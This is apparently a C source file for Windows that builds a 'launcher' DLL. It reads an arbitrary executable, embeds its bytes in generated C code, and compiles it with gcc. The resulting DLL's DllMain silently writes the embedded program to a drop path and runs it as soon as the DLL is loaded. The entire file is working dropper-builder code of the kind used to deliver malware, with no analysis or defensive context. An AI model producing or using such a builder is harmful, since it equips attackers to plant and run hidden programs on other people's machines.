#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

static int append_quoted_argument(char *buffer, size_t capacity, size_t *position, const char *argument)
{
    size_t i = 0;

    if (*position >= capacity)
        return 0;
    buffer[(*position)++] = '"';

    while (argument[i] != '\0') {
        size_t slashes = 0;
        size_t j;

        while (argument[i] == '\\') {
            ++slashes;
            ++i;
        }

        if (argument[i] == '"') {
            size_t needed = slashes * 2 + 1;
            if (needed > capacity - *position || capacity - *position - needed < 1)
                return 0;
            for (j = 0; j < slashes * 2; ++j)
                buffer[(*position)++] = '\\';
            buffer[(*position)++] = '\\';
            buffer[(*position)++] = '"';
            ++i;
        } else if (argument[i] == '\0') {
            size_t needed = slashes * 2;
            if (needed > capacity - *position || capacity - *position - needed < 1)
                return 0;
            for (j = 0; j < needed; ++j)
                buffer[(*position)++] = '\\';
        } else {
            if (slashes > capacity - *position || capacity - *position - slashes < 2)
                return 0;
            for (j = 0; j < slashes; ++j)
                buffer[(*position)++] = '\\';
            buffer[(*position)++] = argument[i++];
        }
    }

    if (*position >= capacity)
        return 0;
    buffer[(*position)++] = '"';
    buffer[*position] = '\0';
    return 1;
}

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    HANDLE input = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    unsigned char *binary = NULL;
    size_t binary_length;
    size_t offset;
    DWORD current_dir_length;
    char current_dir[MAX_PATH];
    char source_path[MAX_PATH];
    char output_dir[MAX_PATH];
    char temporary_dll[MAX_PATH];
    char command_line[32768];
    size_t command_position;
    FILE *source = NULL;
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_info;
    DWORD exit_code = 1;
    int result = -1;
    size_t i;
    const char *last_separator;
    size_t output_dir_length;

    if (binary_path == NULL || dll_out_path == NULL ||
        binary_path[0] == '\0' || dll_out_path[0] == '\0')
        return -1;

    input = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(input, &file_size) || file_size.QuadPart <= 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)SIZE_MAX)
        goto cleanup;

    binary_length = (size_t)file_size.QuadPart;
    binary = (unsigned char *)malloc(binary_length);
    if (binary == NULL)
        goto cleanup;

    offset = 0;
    while (offset < binary_length) {
        DWORD amount = (DWORD)((binary_length - offset) > 1048576U
                                   ? 1048576U
                                   : (binary_length - offset));
        DWORD bytes_read = 0;
        if (!ReadFile(input, binary + offset, amount, &bytes_read, NULL) ||
            bytes_read == 0)
            goto cleanup;
        offset += bytes_read;
    }

    if (!CloseHandle(input)) {
        input = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    input = INVALID_HANDLE_VALUE;

    current_dir_length = GetCurrentDirectoryA(MAX_PATH, current_dir);
    if (current_dir_length == 0 || current_dir_length >= MAX_PATH)
        goto cleanup;

    if (GetTempFileNameA(current_dir, "ldc", 0, source_path) == 0)
        goto cleanup;

    last_separator = strrchr(dll_out_path, '\\');
    {
        const char *forward_separator = strrchr(dll_out_path, '/');
        if (forward_separator != NULL &&
            (last_separator == NULL || forward_separator > last_separator))
            last_separator = forward_separator;
    }

    if (last_separator == NULL) {
        if (strlen(current_dir) >= sizeof(output_dir))
            goto cleanup;
        strcpy(output_dir, current_dir);
    } else {
        output_dir_length = (size_t)(last_separator - dll_out_path);
        if (output_dir_length == 0 && dll_out_path[0] == '\\')
            output_dir_length = 1;
        if (output_dir_length == 0 && dll_out_path[0] == '/')
            output_dir_length = 1;
        if (output_dir_length == 2 && dll_out_path[1] == ':')
            output_dir_length = 3;
        if (output_dir_length >= sizeof(output_dir))
            goto cleanup;
        memcpy(output_dir, dll_out_path, output_dir_length);
        output_dir[output_dir_length] = '\0';
    }

    if (GetTempFileNameA(output_dir, "ldo", 0, temporary_dll) == 0)
        goto cleanup;

    source = fopen(source_path, "wb");
    if (source == NULL)
        goto cleanup;

    if (fputs("#include <windows.h>\n#include \"config.h\"\n"
              "static const unsigned char launcher_payload[] = {",
              source) == EOF)
        goto cleanup;

    for (i = 0; i < binary_length; ++i) {
        if (fprintf(source, "%s0x%02X", i == 0 ? "" : ",",
                    (unsigned int)binary[i]) < 0)
            goto cleanup;
        if ((i + 1) % 16 == 0 && fputc('\n', source) == EOF)
            goto cleanup;
    }

    if (fputs(
            "};\n"
            "BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)\n"
            "{\n"
            "    (void)instance;\n"
            "    (void)reserved;\n"
            "    if (reason == DLL_PROCESS_ATTACH) {\n"
            "        HANDLE file = CreateFileA(DROP_PATH, GENERIC_WRITE, 0, NULL, "
            "CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
            "        if (file != INVALID_HANDLE_VALUE) {\n"
            "            size_t offset = 0;\n"
            "            while (offset < sizeof(launcher_payload)) {\n"
            "                DWORD amount = (DWORD)((sizeof(launcher_payload) - offset) > "
            "1048576U ? 1048576U : (sizeof(launcher_payload) - offset));\n"
            "                DWORD written = 0;\n"
            "                if (!WriteFile(file, launcher_payload + offset, amount, "
            "&written, NULL) || written == 0)\n"
            "                    break;\n"
            "                offset += written;\n"
            "            }\n"
            "            CloseHandle(file);\n"
            "        }\n"
            "        {\n"
            "            STARTUPINFOA startup;\n"
            "            PROCESS_INFORMATION process;\n"
            "            ZeroMemory(&startup, sizeof(startup));\n"
            "            ZeroMemory(&process, sizeof(process));\n"
            "            startup.cb = sizeof(startup);\n"
            "            if (CreateProcessA(DROP_PATH, NULL, NULL, NULL, FALSE, 0, NULL, "
            "NULL, &startup, &process)) {\n"
            "                CloseHandle(process.hThread);\n"
            "                CloseHandle(process.hProcess);\n"
            "            }\n"
            "        }\n"
            "    }\n"
            "    return TRUE;\n"
            "}\n",
            source) == EOF)
        goto cleanup;

    if (fclose(source) != 0) {
        source = NULL;
        goto cleanup;
    }
    source = NULL;

    strcpy(command_line, "gcc -m64 -shared -O2 -s -x c -o ");
    command_position = strlen(command_line);
    if (!append_quoted_argument(command_line, sizeof(command_line),
                                &command_position, temporary_dll) ||
        command_position + 1 >= sizeof(command_line))
        goto cleanup;
    command_line[command_position++] = ' ';
    command_line[command_position] = '\0';
    if (!append_quoted_argument(command_line, sizeof(command_line),
                                &command_position, source_path))
        goto cleanup;

    ZeroMemory(&startup_info, sizeof(startup_info));
    ZeroMemory(&process_info, sizeof(process_info));
    startup_info.cb = sizeof(startup_info);

    if (!CreateProcessA(NULL, command_line, NULL, NULL, FALSE, 0, NULL, NULL,
                        &startup_info, &process_info))
        goto cleanup;

    WaitForSingleObject(process_info.hProcess, INFINITE);
    if (GetExitCodeProcess(process_info.hProcess, &exit_code))
        result = exit_code == 0 ? 0 : -1;
    CloseHandle(process_info.hThread);
    CloseHandle(process_info.hProcess);

    if (result == 0 &&
        !MoveFileExA(temporary_dll, dll_out_path,
                     MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH))
        result = -1;

cleanup:
    if (source != NULL)
        fclose(source);
    if (input != INVALID_HANDLE_VALUE)
        CloseHandle(input);
    free(binary);
    if (source_path[0] != '\0')
        DeleteFileA(source_path);
    if (temporary_dll[0] != '\0')
        DeleteFileA(temporary_dll);
    return result;
}